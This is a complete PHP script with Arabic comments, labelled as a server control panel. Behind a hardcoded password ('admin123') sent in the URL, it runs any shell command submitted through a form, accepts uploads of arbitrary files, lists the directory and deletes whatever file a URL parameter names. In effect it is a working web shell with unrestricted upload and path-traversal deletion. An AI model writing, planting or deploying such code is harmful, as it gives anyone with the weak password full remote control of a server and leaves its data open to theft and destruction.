<?php
session_start();

// تأمين الدخول بكلمة مرور (يجب تغييرها!)
$password = "admin123";

// تسجيل الدخول عبر `GET`
if (isset($_GET['pass']) && $_GET['pass'] === $password) {
    $_SESSION['authenticated'] = true;
}

// تسجيل الخروج
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: control.php");
    exit();
}

// التحقق من المصادقة
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    die("<form method='GET'><input type='password' name='pass' placeholder='أدخل كلمة المرور'><input type='submit' value='دخول'></form>");
}

echo "<h2>لوحة التحكم في السيرفر</h2>";
echo "<a href='control.php?logout=true'>تسجيل الخروج</a><br><br>";

// تنفيذ الأوامر
if (isset($_POST['cmd'])) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
}

// رفع الملفات
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], __DIR__ . "/" . $_FILES['file']['name']);
    echo "تم رفع الملف: " . $_FILES['file']['name'] . "<br>";
}

// عرض الملفات والمجلدات
echo "<h3>استعراض الملفات</h3>";
$files = scandir(__DIR__);
echo "<ul>";
foreach ($files as $file) {
    if ($file !== "." && $file !== "..") {
        echo "<li><a href='$file'>$file</a> | <a href='?delete=$file' style='color:red;'>حذف</a></li>";
    }
}
echo "</ul>";

// حذف الملفات
if (isset($_GET['delete'])) {
    unlink($_GET['delete']);
    header("Location: control.php");
    exit();
}
?>

<h3>تنفيذ الأوامر</h3>
<form method="POST">
    <input type="text" name="cmd" placeholder="أدخل الأمر">
    <input type="submit" value="تنفيذ">
</form>

<h3>رفع الملفات</h3>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="رفع">
</form>
